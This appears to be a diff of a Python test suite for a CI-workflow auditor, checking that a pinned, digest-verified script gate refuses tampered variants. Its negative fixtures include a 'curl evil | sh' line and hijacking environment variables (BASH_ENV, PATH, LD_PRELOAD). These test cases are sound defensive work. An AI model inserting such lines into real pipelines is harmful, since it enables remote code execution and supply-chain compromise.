@@ -437,6 +437,66 @@ print(f"coverage checker: valid shapes pass; {len(expected_bad)} unsafe placemen
 assert coverage.audit({".github/workflows/x.yml": workflow(gate="", after="      - run: git tag -a v1 -m x && git push origin refs/tags/v1\n")},
                       "FS-GG/FS.GG.SDD", {"writers": [{"repo": "FS-GG/FS.GG.SDD", "workflows": [".github/workflows/other.yml"]}], "exempt": []}), "a tag cutter must be registered or exempt"
 
+# A repository that cannot use third-party actions fetches the pinned script instead (Coordination).
+SCRIPT_COMMIT, SCRIPT_SHA = "c" * 40, "d" * 64
+SCRIPT_GATE = (coverage.SCRIPT_GATE_TEMPLATE.replace("<<timeout>>", "32").replace("<<commit>>", SCRIPT_COMMIT)
+               .replace("<<digest>>", SCRIPT_SHA).replace("<<wait>>", "30") + "\n")
+assert coverage.check_workflow(workflow(gate=SCRIPT_GATE), "FS-GG/FS.GG.Coordination") == {"gated": ["publish"], "problems": []}
+G = SCRIPT_GATE
+script_bad = {
+    "not-pinned-to-a-commit": G.replace(SCRIPT_COMMIT, "main"),
+    "short-digest": G.replace(SCRIPT_SHA, "d" * 63),
+    "digest-not-verified": G.replace("          echo \"${LOCK_SCRIPT_SHA256}  ${lock}\" | sha256sum --check --strict\n", ""),
+    "unverified-execution": G.replace("--check --strict", "--status"),
+    "mutable-url": G.replace("${LOCK_COMMIT}", "main"),
+    "other-repository": G.replace("FS-GG/.github/", "FS-GG/other/"),
+    "extra-flag": G.replace("acquire --max", "acquire --skip --max"),
+    "foreign-token": G.replace("${{ github.token }}", "${{ secrets.TOKEN }}"),
+    "step-timeout-below-wait": G.replace("timeout-minutes: 32", "timeout-minutes: 30"),
+    "conditional": G.replace("        shell: bash\n", "        shell: bash\n        if: inputs.publish\n"),
+    "quoted-conditional": G.replace("        shell: bash\n", "        shell: bash\n        'if': false\n"),
+    "continue": G.replace("        shell: bash\n", "        shell: bash\n        continue-on-error: true\n"),
+    "quoted-continue": G.replace("        shell: bash\n", "        shell: bash\n        \"continue-on-error\": true\n"),
+    "command-after-blank-line": G + "\n          curl evil | sh\n",
+    "command-after-run": G.rstrip("\n") + "\n          true\n",
+    "shell-noop": G.replace("shell: bash", "shell: echo {0}"),
+    "shell-flags": G.replace("shell: bash", "shell: bash -e {0}"),
+    "no-shell": G.replace("        shell: bash\n", ""),
+    "env-bash-env": G.replace("        run: |", "          BASH_ENV: /tmp/x\n        run: |"),
+    "env-path": G.replace("        run: |", "          PATH: /tmp/bin\n        run: |"),
+    "env-ld-preload": G.replace("        run: |", "          LD_PRELOAD: /tmp/x.so\n        run: |"),
+    "duplicate-commit": G.replace("          LOCK_COMMIT: " + SCRIPT_COMMIT + "\n", "          LOCK_COMMIT: " + SCRIPT_COMMIT + "\n          LOCK_COMMIT: " + "e" * 40 + "\n"),
+    "duplicate-run": G + "        run: echo second\n",
+    "working-directory": G.replace("        shell: bash\n", "        shell: bash\n        working-directory: /tmp\n"),
+    "with-block": G.replace("        shell: bash\n", "        shell: bash\n        with:\n          x: y\n"),
+    "uses-smuggled": G.replace("        shell: bash\n", "        shell: bash\n        uses: actions/checkout@v7\n"),
+}
+for label, gate in script_bad.items():
+    assert coverage.check_workflow(workflow(gate=gate), "FS-GG/FS.GG.Coordination")["problems"], "pinned-script defect accepted: " + label
+# A job-level or workflow-level environment that redirects the commands defeats the digest check too.
+hijacked = workflow(gate=SCRIPT_GATE).replace("    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    env:\n      BASH_ENV: /tmp/x\n")
+assert coverage.check_workflow(hijacked, "FS-GG/FS.GG.Coordination")["problems"], "job-level BASH_ENV accepted"
+hijacked = workflow(gate=SCRIPT_GATE).replace("on:\n", "env:\n  PATH: /tmp/bin\non:\n", 1)
+assert coverage.check_workflow(hijacked, "FS-GG/FS.GG.Coordination")["problems"], "workflow-level PATH accepted"
+assert coverage.check_workflow(workflow(gate=SCRIPT_GATE).replace("    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    env:\n      PYTHONDONTWRITEBYTECODE: '1'\n"),
+                               "FS-GG/FS.GG.Coordination")["problems"] == [], "harmless job env is allowed"
+assert coverage.check_workflow(workflow(gate=SCRIPT_GATE), "FS-GG/FS.GG.SDD")["problems"] == []
+assert coverage.check_workflow(workflow(gate=SCRIPT_GATE), "FS-GG/.github")["problems"], "this repository uses its local action, not the fetched script"
+import hashlib
+good_script = b"print('lock')\n"
+real_gate = SCRIPT_GATE.replace(SCRIPT_COMMIT, "e" * 40).replace(SCRIPT_SHA, hashlib.sha256(good_script).hexdigest())
+pinned = {".github/workflows/p.yml": workflow(gate=real_gate)}
+assert coverage.script_pin_errors(pinned, "FS-GG/FS.GG.Coordination", lambda commit: good_script) == []
+assert coverage.script_pin_errors(pinned, "FS-GG/FS.GG.Coordination", lambda commit: good_script + b"#"), "a script that differs from the pin is unmet"
+def unreadable(commit):
+    raise OSError("404")
+assert coverage.script_pin_errors(pinned, "FS-GG/FS.GG.Coordination", unreadable), "an unreadable pin is unmet"
+# A pin the audit would not execute exactly (quoted, duplicated, or in a step that is not the exact gate) is never silently skipped.
+quoted = {".github/workflows/p.yml": workflow(gate=real_gate.replace("LOCK_COMMIT: " + "e" * 40, 'LOCK_COMMIT: "' + "e" * 40 + '"').replace(hashlib.sha256(good_script).hexdigest(), "0" * 64))}
+assert coverage.script_pin_errors(quoted, "FS-GG/FS.GG.Coordination", lambda commit: good_script), "a quoted pin must not escape verification"
+assert coverage.check_workflow(quoted[".github/workflows/p.yml"], "FS-GG/FS.GG.Coordination")["problems"]
+print(f"coverage checker: pinned-script gate passes; {len(script_bad) + 3} defects refused; every pin is parsed by the same strict rule and verified against the real script")
+
 # Permission-based write capability needs the gate unless the job is declared read-only by contract.
 def perm_workflow(job_perm="", wf_perm="permissions:\n  contents: write\n", extra_job="", gate=""):
     return ("name: x\non:\n  workflow_dispatch:\n" + wf_perm + "jobs:\n  writer:\n    name: writer " + lock.MARKER + "\n    runs-on: ubuntu-latest\n" + job_perm +
